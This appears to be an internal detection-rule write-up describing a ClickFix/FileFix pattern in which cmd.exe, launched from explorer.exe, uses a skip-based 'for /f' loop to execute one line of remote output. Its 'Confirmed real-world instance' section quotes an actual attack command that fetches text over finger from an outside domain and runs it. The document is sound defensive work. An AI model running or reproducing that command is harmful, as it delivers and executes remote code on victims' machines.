# ClickFix/FileFix - Explorer-Spawned CMD Using Skip-Based FOR /F Loop

**Severity:** Critical\
**MITRE ATT&CK:** T1204.001 (User Execution: Malicious Link), T1027
(Obfuscated Files or Information), T1105 (Ingress Tool Transfer)\
**Owner:** Jino

## Description

Detects cmd.exe, spawned directly by explorer.exe, using a `for /f` loop
with a `skip=N` clause to extract and execute a specific line from the
output of another command. This is a distinctive delivery pattern
confirmed in a real incident at [this environment]: the attacker's server
returns a large block of junk/padding content in response to a query
(observed here via the finger protocol against a compromised-looking
domain), and the `skip=` clause discards that padding to isolate the one
line that is an actual command, which the loop then executes via its
variable (e.g. `%e`).

## Confirmed real-world instance

Observed command line (caret-obfuscated to evade naive string matching;
carets stripped here for clarity):
    /c start "" /min for /f "skip=25 delims=" %e in
    ('finger tdPspMTuLD@finger.linkedby.org') do %e

This specific instance uses finger.exe as the inner command — see
finger-command-abuse.pq in Rules\LOLBAS\, which should also fire on the
same incident since finger.exe is spawned as a child of this cmd.exe. Other
observed ClickFix/FileFix variants use certutil, bitsadmin, or curl in the
same skip/delims loop structure instead of finger — this rule is written
to catch the pattern generically rather than being tied to one specific
inner command.

## Why this pattern is reliable

Legitimate interactive or scripted use of `for /f` with a `skip=` clause
to parse command output exists, but the combination of (a) explorer.exe as
the direct parent — meaning it came from Win+R/Ctrl+V, not a script or
scheduled task — and (b) a skip/delims loop specifically built to isolate
one line of output and execute it is a very unusual, purpose-built
evasion shape. Normal admin `for /f` usage doesn't need to skip a large,
arbitrary number of lines to find "the real command."

## Tuning note

If you see other inner commands in this same for/f-loop shape (certutil,
curl, bitsadmin, nslookup — anything that can fetch remote data as text),
that's the same technique with a different LOLBin, not a different
technique. Don't create a new rule per inner command; this rule's
condition is deliberately inner-command-agnostic.

## Response action

Treat as confirmed compromise given the explorer.exe parent + skip/delims
shape together. Pull the full command line, resolve the destination
domain, and correlate against any finger.exe/certutil.exe/curl.exe child
process spawned in the same timeframe for the actual payload retrieved.